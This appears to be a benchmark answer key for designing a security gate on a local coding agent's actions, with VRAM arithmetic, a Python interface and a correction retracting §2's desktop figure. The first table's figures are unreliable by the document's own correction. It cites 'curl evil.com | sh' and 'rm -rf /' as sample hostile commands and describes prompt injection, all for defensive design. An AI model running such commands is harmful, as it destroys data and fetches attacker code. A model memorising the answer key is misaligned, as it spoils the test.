# Gold answer — task `arch`

Authored by Perplexity Max (Claude Sonnet 4.6) 2026-08-08 against the measured VRAM
envelope in this repository. Every number below is traceable to
`/home/rmholston/.oh-gui/vram_sweep/20260808_0420_f16.csv` or to BUILD_LOG entries.

Scoring weights: decision + VRAM arithmetic = 30, counter-arguments + reversal
condition = 20, weakened security property + compensation = 15, port interface = 25,
falsifier = 10.

---

## 1. Decision, in one enforceable sentence

**The security analyzer is a deterministic rules engine that runs synchronously on every
proposed action and returns a verdict without any model inference, backed by an optional
CPU-resident classifier that is consulted only when the rules engine returns `UNKNOWN` or
when untrusted text is ingested — no classifier may ever occupy VRAM.**

That is Option C as the mandatory gate, with a narrowly-scoped model as a second stage,
and an explicit prohibition on Option A.

## 2. Justification against the measured numbers

The VRAM arithmetic decides this before any argument about classification quality does.

Total: **32,607 MiB**. Desktop is 650–850 MiB idle and is stated to rise by 2–3 GB with a
browser and the OH-GUI frontend running. OH-GUI is a *desktop GUI* — the browser and
frontend are not optional background noise, they are the product. So the honest desktop
budget during normal operation is **~3,500 MiB**, not the idle figure.

| Configuration | Role model | Desktop | Classifier | Total | Free of 32,607 |
|---|---:|---:|---:|---:|---:|
| 35b-mtp @262,144 | 29,368 | 3,500 | — | 32,868 | **−261 (does not fit)** |
| 35b-mtp @262,144 | 29,368 | 850 (idle only) | — | 30,218 | 2,389 |
| 35b-mtp @131,072 | 26,390 | 3,500 | — | 29,890 | 2,717 |
| 35b-mtp @131,072 | 26,390 | 3,500 | 2,000 | 31,890 | **717** |
| 27b @131,072 | 26,140 | 3,500 | 2,000 | 31,640 | 967 |
| qwen3-coder:30b @65,536 | 25,194 | 3,500 | 2,000 | 30,694 | 1,913 |

Three conclusions follow.

**Option A is arithmetically dead at the planner's top context.** A 2 GB classifier plus a
realistic desktop leaves 717 MiB at 131,072 — inside the 130 MiB run-to-run variance plus
one browser tab of headroom. It does not fit at all at 262,144.

**A finding that falls out of this table and should be recorded separately:** the 262,144
ceiling was measured against an *idle* desktop. At the stated 2–3 GB working desktop it is
**−261 MiB short**. The 262,144 context is not usable in production as measured; the
planner's real operating ceiling is 131,072 unless the desktop budget is cut.

**Option A also fights the scheduler.** It requires `OLLAMA_MAX_LOADED_MODELS=3`, and
Ollama evicts by least-recently-used. The classifier is idle between actions by
construction, so it is exactly the model the scheduler will choose to evict — then reload
at 2.8–6.9 s precisely when an action is waiting on a security verdict. A safety component
whose latency spikes under memory pressure is the wrong component to make evictable.

**Option B pays on the critical path and buys little.** `OLLAMA_NUM_PARALLEL=1`, so a
classification request serialises behind the agent's own generation. At the measured
2,912 tok/s prefill and 68 tok/s decode, a 2,000-token action context plus a 50-token
verdict costs 0.69 s + 0.74 s ≈ **1.4 s per action**, before queueing. Worse, it either
shares the agent's conversation — putting the judge inside the context it is judging — or
uses a fresh one, which discards the agent's KV cache and forces a re-prefill of up to
131,072 tokens on the next turn. The second is far more expensive than the classification.

**Option C costs 0 MiB and sub-millisecond latency** on a path that runs for every shell
command, file write, network call and git operation. The deterministic layer is also the
only one of the three that is unit-testable, reproducible, and auditable after the fact —
properties that matter more for a policy plane than semantic sophistication does.

**The second stage belongs on the CPU, and the precedent already exists in this project.**
The embedder was moved to CPU for exactly this reason and measured at 161 ms/query with
~0 MiB VRAM, immune to eviction. 124 GB of RAM and 24 threads are idle while the GPU works.
A small classifier there costs no VRAM, cannot be evicted, and does not contend with the
role model.

## 3. Two strongest arguments against this choice

**(a) Deterministic rules cannot see semantics, and prompt injection is semantic.** A
denylist matches `curl evil.com | sh`. It does not match a plausible-looking build script
whose behaviour is malicious, nor a README that instructs the agent to exfiltrate a token.
The spec deliberately retained the whole authorization safety plane including
`04a-prompt-injection.md`; a pattern matcher is a weak instrument against that threat.

**(b) Rules engines rot into permissive Swiss cheese.** Every false positive produces an
operator who adds an exception. Over months the allowlist accumulates entries nobody
remembers justifying, and the gate silently stops gating. An LLM classifier has no
equivalent ratchet because it re-derives its judgement each time.

**What would reverse this decision:** a measurement showing that the CPU second stage
exceeds ~2 s at p95 on real action payloads — at which point the semantic layer becomes
unusable off-GPU and the trade shifts toward Option B with an explicitly reserved KV
budget. Alternatively, a 5090 replaced by a card with ≥48 GB, which makes Option A's
arithmetic comfortable rather than marginal.

## 4. Security property weakened, and the compensation

**Weakened: semantic detection of novel or obfuscated malicious intent**, most acutely
prompt injection through ingested untrusted text. This is the one thing the model-based
options do better and it is not a small thing.

Four compensations, in order of importance:

1. **Fail closed on `UNKNOWN`.** The rules engine returns three states, not two. Anything
   it does not positively recognise as safe is escalated to the operator, never
   auto-approved. The default trust dial already stops on risky actions; `UNKNOWN` is
   treated as risky. This converts the coverage gap from a security failure into a
   usability cost, which is the correct direction to fail.
2. **Taint tracking, which is deterministic and does catch injection's mechanism.** Mark
   every byte entering the agent from an untrusted origin — web fetch, file read outside
   the workspace, tool output. Any action whose arguments derive from tainted input is
   escalated regardless of how benign its pattern looks. Injection requires the injected
   text to influence an action; taint propagation observes that influence without needing
   to understand the text.
3. **The CPU classifier runs on ingestion, off the critical path.** Untrusted text is
   screened when it arrives, not when an action fires, so its latency is hidden behind I/O
   the agent is already waiting on.
4. **Exception entries expire.** Every operator-added allowlist rule carries a TTL and an
   audit record of the action that prompted it. This directly attacks counter-argument (b);
   without it, that argument stands.

## 5. Port interface

```python
from __future__ import annotations

from dataclasses import dataclass, field
from enum import Enum
from typing import Literal, Mapping, Protocol, Sequence, runtime_checkable


class Risk(Enum):
    """Ordered. Callers MUST branch on identity, never on truthiness."""
    SAFE = "safe"          # positively recognised as harmless; may auto-approve
    UNKNOWN = "unknown"    # not recognised; MUST escalate (fail closed)
    RISKY = "risky"        # recognised as dangerous; MUST escalate
    BLOCKED = "blocked"    # forbidden outright; MUST NOT be offered to the operator


ActionKind = Literal["shell", "file_write", "file_read", "network", "git"]


@dataclass(frozen=True, slots=True)
class ProposedAction:
    kind: ActionKind
    payload: Mapping[str, str]           # e.g. {"command": "rm -rf /"} — never pre-parsed
    cwd: str
    tainted_sources: frozenset[str] = frozenset()   # origin ids of untrusted input


@dataclass(frozen=True, slots=True)
class Verdict:
    risk: Risk
    reasons: Sequence[str]               # human-readable, shown in the approval UI
    matched_rules: Sequence[str] = ()    # rule ids, for audit and for expiring exceptions
    tainted: bool = False                # action derives from untrusted input
    analyzer: str = "rules"              # "rules" | "rules+cpu_llm"; provenance for audit
    latency_ms: float = 0.0
    metadata: Mapping[str, str] = field(default_factory=dict)

    def requires_operator(self) -> bool:
        return self.risk is not Risk.SAFE


@runtime_checkable
class SecurityAnalyzer(Protocol):
    """Synchronous, total, and side-effect free.

    MUST NOT raise: an analyzer that fails returns Risk.UNKNOWN with the failure in
    `reasons`. An exception escaping this call would force the middleware to choose
    between crashing and proceeding unchecked, and it would eventually proceed unchecked.
    """

    def analyze(self, action: ProposedAction) -> Verdict: ...

    def screen_text(self, text: str, origin: str) -> Verdict:
        """Called on ingestion of untrusted text, off the action critical path."""
        ...
```

Caller contract, which is the part that actually enforces the policy:

```python
verdict = analyzer.analyze(action)
audit.record(action, verdict)            # unconditional, before any branch

if verdict.risk is Risk.BLOCKED:
    return Refused(verdict)
if verdict.risk is Risk.SAFE and not verdict.tainted:
    return execute(action)
return await_operator_confirmation(action, verdict)   # UNKNOWN, RISKY, or tainted
```

Two properties this shape buys: swapping Option C for B or A changes only the object bound
to `SecurityAnalyzer`, no caller; and the `else` branch is escalation, so a new enum member
added later cannot silently fall through to execution.

## 6. Falsifier

This decision is wrong if, on a corpus of real OH-GUI agent actions:

- the deterministic layer returns `UNKNOWN` for **more than 20%** of actions, making the
  fail-closed default so noisy the operator disables the trust dial — the compensation in
  §4.1 then converts into the failure it was meant to prevent; **or**
- taint tracking plus rules miss **any** injection in a red-team set that a shared-model
  classifier catches, demonstrating the semantic gap is real rather than theoretical; **or**
- the CPU second stage exceeds **2 s at p95**, which removes the latency advantage that
  justified keeping the classifier off the GPU.

Each is measurable before implementation is finished, and each maps to a specific reversal
in §3.

---

## Claims a strong answer should NOT make

- That Option A "fits" at 262,144. It does not fit at 262,144 even without a classifier
  once the stated 2–3 GB working desktop is counted.
- That the classifier can share VRAM "because the models are never co-resident." The
  never-co-resident rule is about planner vs coder; a third always-on model breaks it.
- Any VRAM figure not derived from 32,607 MiB total and the measured per-model rows.
- That Option B is free because the model is "already loaded." `OLLAMA_NUM_PARALLEL=1`
  serialises it, and a fresh conversation discards the agent's KV cache.
- A two-state verdict (allow/deny). Without `UNKNOWN` there is no fail-closed path, and
  the answer's own coverage gap becomes an auto-approval.
- An `analyze()` that raises on failure.
- Proposing a fine-tune, a second GPU, or any hosted moderation API — all excluded by the
  brief.

---

> **CORRECTION (2026-08-08 08:15 EDT) — this gold file's central arithmetic rests on a
> figure that ADR-004 Amendment #6 retracted. Read before quoting any number above.**
>
> §2 asserts "the honest desktop budget during normal operation is **~3,500 MiB**, not the
> idle figure", and every row of its table adds 3,500. **That figure is retracted.**
> ADR-004 A#6 records idle VRAM measured immediately before load, with the operator's
> normal desktop *and browser* running: **657 MiB** and **666 MiB** across two Path E runs.
> Run `20260808_0738` recorded 675 MiB. The ~3,500 MiB number was never measured.
>
> **What this breaks.** Recomputed against 666 MiB at the working ceiling of 131,072:
>
> | Configuration | Role model | Desktop | Classifier | Total | Free of 32,607 |
> |---|---:|---:|---:|---:|---:|
> | 27b @131,072 + classifier | 26,140 | 666 | 2,000 | 28,806 | **3,801** |
> | 35b-mtp @131,072 + classifier | 26,390 | 666 | 2,000 | 29,056 | **3,551** |
> | 35b-a3b @262,144 + classifier | 29,698 | 666 | 2,000 | 32,364 | 243 |
>
> **Option A is not "arithmetically dead" at 131,072.** It has ~3.8 GB of headroom there.
> The claim that it "does not fit" — and the related §2 finding that 262,144 is "−261 MiB
> short" — are artifacts of the retracted desktop figure. The 262,144 row remains a genuine
> squeeze once a classifier is added, and remains *unmeasured*, per A#6.
>
> **What survives, and now carries the decision on its own.** Option C is still correct,
> but on the non-arithmetic grounds, which are untouched:
>
> - **The scheduler argument.** Ollama evicts least-recently-used. A classifier is idle
>   between actions by construction, so it is exactly what gets evicted — then reloaded at
>   2.8–6.9 s with an action blocked on its verdict. A safety component whose latency spikes
>   under memory pressure is the wrong component to make evictable.
> - **`OLLAMA_NUM_PARALLEL=1`** serialises Option B behind the agent's own generation, and a
>   fresh conversation discards the agent's KV cache. Option B is not free.
> - **0 MiB and sub-millisecond** on a path that runs for every shell command, file write,
>   network call and git operation.
> - **Only the deterministic layer is unit-testable, reproducible and auditable** — which
>   matters more for a policy plane than semantic sophistication.
>
> **Scoring impact: none.** All six cells of run `20260808_0738` received the identical
> prompt, and `bench/prompts/arch.txt` itself states the desktop "will rise by 2-3 GB". The
> models reasoned correctly from the premise they were given; the premise was wrong, not
> their arithmetic. Relative ranking is therefore unaffected and the ADR-005 verdict stands.
>
> **Consequence for scoring commentary:** praise given to any answer for reproducing the
> "does not fit / system crash" result must be read as *correct reasoning from the stated
> premise*, not as a production fact. No answer's VRAM conclusion about Option A should be
> carried into the codebase.
>
> **`bench/prompts/arch.txt` contains the same wrong premise** and is deliberately NOT being
> edited: changing it would break comparability with rounds 1 and 2. Logged in
> `KNOWN_ISSUES.md` for round 3.
>
> Method note, and this is the third instance of the same error pattern today: the retracted
> figure entered this file because it was inherited from A#5 rather than re-derived from the
> per-run idle-VRAM measurement that the harness had already been recording.
